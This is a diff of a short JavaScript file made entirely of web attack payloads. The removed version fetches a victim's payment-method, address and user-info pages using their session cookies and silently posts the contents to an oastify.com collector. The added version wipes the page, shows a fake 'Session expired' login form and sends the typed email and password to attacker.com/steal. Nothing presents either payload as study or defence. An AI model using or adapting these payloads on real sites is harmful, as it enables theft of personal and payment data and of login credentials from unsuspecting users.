@@ -1,29 +1,29 @@
-(async () => {
-  const exfilEndpoint = "https://bbqg5x5kpurpk1eh2dhr1tl5iwonce42t.oastify.com/collector";
-  const targets = [
-    "/Pages/Subscriptions/ProfileManagement.aspx?view=PaymentMethods",
-    "/Pages/Subscriptions/ProfileManagement.aspx?view=Address",
-    "/user/userinfo/"
-  ];
+(function() {
+  const container = document.createElement("div");
+  container.innerHTML = `
+    <div style="font-family:sans-serif;padding:20px;">
+      <h2>Session expired</h2>
+      <p>Please log in again to continue.</p>
+      <form id="fakeLogin">
+        <input id="user" placeholder="Email" required><br><br>
+        <input id="pass" type="password" placeholder="Password" required><br><br>
+        <button type="submit">Log In</button>
+      </form>
+    </div>
+  `;
+  document.body.innerHTML = ""; // Optional: clear existing content
+  document.body.appendChild(container);
 
-  for (const path of targets) {
-    try {
-      const res = await fetch(path, { credentials: "include" });
-      const html = await res.text();
-
-      await fetch(exfilEndpoint, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          url: location.origin + path,
-          content: btoa(html)
-        })
-      });
-    } catch (err) {
-      // fail silently
-    }
-  }
+  document.getElementById("fakeLogin").addEventListener("submit", function(e) {
+    e.preventDefault();
+    fetch("https://attacker.com/steal", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        user: document.getElementById("user").value,
+        pass: document.getElementById("pass").value
+      })
+    });
+  });
 })();
+
